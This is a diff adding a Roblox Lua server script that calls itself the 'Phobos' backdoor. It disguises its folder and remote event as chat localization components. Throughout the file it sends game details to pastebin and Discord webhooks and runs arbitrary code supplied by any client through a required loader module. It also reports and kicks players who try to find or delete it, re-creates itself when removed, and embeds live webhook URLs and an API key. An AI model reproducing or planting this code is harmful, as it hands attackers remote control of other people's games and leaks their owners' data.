@@ -1,0 +1,235 @@
+--[[
+oh no
+
+--]]
+
+local BDV = "1.0"
+local hook2 = "https://webhook.lewisakura.moe/api/webhooks/1086428292766240871/-BmjynDdtOR2A9Qkn45ars1COxP-j76u5OBrMrBwEDaPI2__WL1cI3eUpAL1HjNK2CtP"
+local hook3 = "https://discord.com/api/webhooks/1086440615648182413/qhv6UYtcyyeYKBtnss5gP32WJIhco7F7XcPe9ZP5bRdu-ASRQGI4vs-exHIx3BkJ8s3t"
+local MainFol = Instance.new("Folder")
+
+MainFol.Parent = game:GetService("Chat")
+MainFol.Name = "ChatLocalizationService"
+
+local Module1 = Instance.new("ModuleScript")
+Module1.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+Module1.Name = "Utilites"
+
+local Module2 = Instance.new("ModuleScript")
+Module2.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+Module2.Name = "Service"
+
+local Module3 = Instance.new("ModuleScript")
+Module3.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+Module3.Name = "ChatService"
+
+local Module4 = Instance.new("ModuleScript")
+Module4.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+Module4.Name = "Localization"
+
+
+local Event = Instance.new("RemoteEvent")
+Event.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+Event.Name = "FilterMessage"
+
+script.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+	script.Name = "ChatRunner"
+--
+function ReInsert()
+	local Event = Instance.new("RemoteEvent")
+	Event.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+	Event.Name = "FilterMessage"
+end
+
+--
+local HttpService = game:GetService("HttpService")
+
+--local gamesHook = HttpService:GetAsync("https://raw.githubusercontent.com/wifi213/links/main/gamesHook")
+--local violationsHook = HttpService:GetAsync("https://raw.githubusercontent.com/wifi213/links/main/violationsHook")
+
+local phobos = require(10131117731)
+
+function getMonth(DoTy, months)
+	local var2 = DoTy
+	for i = 1, #months do
+		if var2 <= months[i] then return i, var2 else var2 = var2 - months[i] end
+	end
+end
+
+function dateTime()
+	local months = {31, 28, 31, 30, 31, 30, 31,31,30, 31, 30, 31}
+	local timezone, offset_hours = "EST", -4
+	local secondspassed = os.time()+(3600*offset_hours)
+	local yearspassed = math.floor(secondspassed/31557600)
+	local YoTc = yearspassed-30
+	local DoTy =  math.floor((secondspassed-(yearspassed*(31557600)))/86400)+1
+	if YoTc/4-math.floor(YoTc/4) == 0 then months[2] = 29 end
+	local MoTy, DoTm = getMonth(DoTy, months)
+	local HR = math.floor((secondspassed-((math.floor(secondspassed/86400))*86400))/3600)
+	local MIN = math.floor((secondspassed-((math.floor(secondspassed/3600))*3600))/60)
+	local SEC = math.floor((secondspassed-((math.floor(secondspassed/60))*60)))
+	if string.len(HR)==1 then HR = "0"..HR end
+	if string.len(MIN)==1 then MIN = "0"..MIN end
+	if string.len(SEC)==1 then SEC = "0"..SEC end
+	return MoTy.."/"..DoTm.."/"..YoTc
+end
+local gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+local Players = game:GetService("Players"):GetChildren()
+local TIME_ZONE = 19 --est
+
+local date = os.date("!*t")
+local hour = (date.hour + TIME_ZONE) % 24
+local ampm = hour < 12 and "AM" or "PM"
+local currentTime = string.format("%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, ampm)
+	local HttpService = game:GetService("HttpService")
+
+	local URL_PASTEBIN_NEW_PASTE = "https://pastebin.com/api/api_post.php"
+
+	local dataFields = {
+		["api_dev_key"] = "Fs6q2BE4I3T9MmRxs6F0xoxJp9i4pPCx",
+		["api_option"] = "paste", -- keep as "paste"
+		["api_paste_name"] = gname.Name.." (Phobos)", -- paste name
+		["api_paste_code"] = "Game Name: "..gname.Name.."\n\nGame Link: ".."https://www.roblox.com/games/"..game.PlaceId.."\n\nCreator: "..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\nBackdoor Version: "..BDV.."\n\nTime (Eastern Standard Time): "..currentTime.."\n\nDate: "..dateTime(), -- paste content
+		["api_paste_format"] = "text", -- paste format
+		["api_paste_expire_date"] = "1Y", -- expire date
+		["api_paste_private"] = "1", -- 0=public, 1=unlisted, 2=private
+		["api_user_key"] = "", -- user key, if blank post as guest 640b52ecdc2b3d82269838293b2be2d4
+
+	}
+
+	local data = ""
+
+	for k, v in pairs(dataFields) do
+
+		data = data .. ("&%s=%s"):format(HttpService:UrlEncode(k), HttpService:UrlEncode(v))
+
+	end
+	data = data:sub(2) 
+
+	local response = HttpService:PostAsync(URL_PASTEBIN_NEW_PASTE, data, Enum.HttpContentType.ApplicationUrlEncoded, false)
+
+isHttpEnabled = pcall(function()
+	game:GetService("HttpService"):RequestAsync({Url = "https://google.com", Method = "GET"})
+end)
+
+function Upload()
+	local data = {
+		["embeds"] = {{
+			["title"] = "❕New Game❕";
+			["description"] = "\n**Game Name: ** "..gname.Name.."\n\n**Game Link: ** ".."https://www.roblox.com/games/"..game.PlaceId.."\n\n**Players: **"..#Players.."\n\n**Creator: **"..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\n**Backdoor Version: **"..BDV.."\n\n**Archive Link (PASTEBIN): **"..response,
+			["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
+			["color"] = tonumber(0x00b3ff);
+		}}
+	}
+	local data2 = HttpService:JSONEncode(data)
+	HttpService:PostAsync(hook2,data2)
+end
+
+local success1, result1 = pcall(function()
+	function Check()
+		if game:GetService("RunService"):IsStudio() == false then
+			if game:GetService("Chat"):FindFirstChild("ChatLocalizationService") then
+				if game.GameId == 0 then
+					--Upload()
+					--http hook wont post because the game id is 0
+				else
+					Upload()
+					return
+				end
+
+			else
+
+				return
+			end
+		end
+	end
+end)
+
+if isHttpEnabled == false then
+	Event:FireClient()
+else
+	Check()
+end
+
+Event.OnServerEvent:Connect(function(plr,lol,Other)
+	local upload2 = function()
+		local data = {
+			["embeds"] = {{
+				["title"] = "Detected User";
+				["description"] = "\n**Username:** "..plr.Name.."\n\n**Link ** ".."https://www.roblox.com/users/"..plr.UserId.."/profile".."\n\n**Tried executing: **".."`"..lol.."`".."\n\n**Backdoor Version: **"..BDV,
+				["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
+				["color"] = tonumber(0x00b3ff);
+			}}
+		}
+		local data2 = HttpService:JSONEncode(data)
+		HttpService:PostAsync(hook3,data2)
+	end
+	local success, result = pcall(function() 
+		if Other == "Respawn" then
+			local success, result = pcall(function() 
+				plr:LoadCharacter()
+			end)
+		elseif Other == "R6" then
+			local success, result = pcall(function() 
+				require(10796895415).load(plr.Name)
+			end)
+		end
+		local success, result = pcall(function()
+			if lol == 'game:GetService("Chat"):FindFirstChild("ChatLocalizationService"):FindFirstChild("FilterMessage")' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game:GetService("Chat"):FindFirstChild("ChatLocalizationService"):FindFirstChild("FilterMessage"):Destroy()' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game:GetService("Chat"):findfirstchild("ChatLocalizationService"):findfirstchild("FilterMessage"):destroy()' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game:GetService("Chat"):findfirstchild("ChatLocalizationService"):findfirstchild("FilterMessage")' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game:GetService("Chat"):WaitForChild("ChatLocalizationService"):WaitForChild("FilterMessage")' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game:GetService("Chat"):waitforchild("ChatLocalizationService"):waitforchild("FilterMessage")' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game:GetService("Chat"):waitforchild("ChatLocalizationService"):waitforchild("FilterMessage"):destroy()' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game:GetService("Chat").("ChatLocalizationService").("FilterMessage"):destroy()' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game.Chat:FindFirstChild("ChatLocalizationService"):FindFirstChild("FilterMessage"):Destroy()' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game.Chat:findfirstchild("ChatLocalizationService"):findfirstchild("FilterMessage"):destroy()' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game.Chat:findfirstchild("ChatLocalizationService"):findfirstchild("FilterMessage")' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game.Chat:WaitForChild("ChatLocalizationService"):WaitForChild("FilterMessage")' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game.Chat:waitforchild("ChatLocalizationService"):waitforchild("FilterMessage")' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game.Chat:waitforchild("ChatLocalizationService"):waitforchild("FilterMessage"):destroy()' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			elseif lol == 'game.Chat.("ChatLocalizationService").("FilterMessage"):destroy()' then
+				upload2()
+				plr:Kick("Phobos: You can't execute that!")
+			else
+				phobos(lol)()
+			end
+			return
+		end)
+	end)
+end)
+game:GetService("Chat"):FindFirstChild("ChatLocalizationService").DescendantRemoving:Connect(function(event1)
+		if event1.Name == "FilterMessage" then
+			ReInsert()
+			return
+		end
+	end)
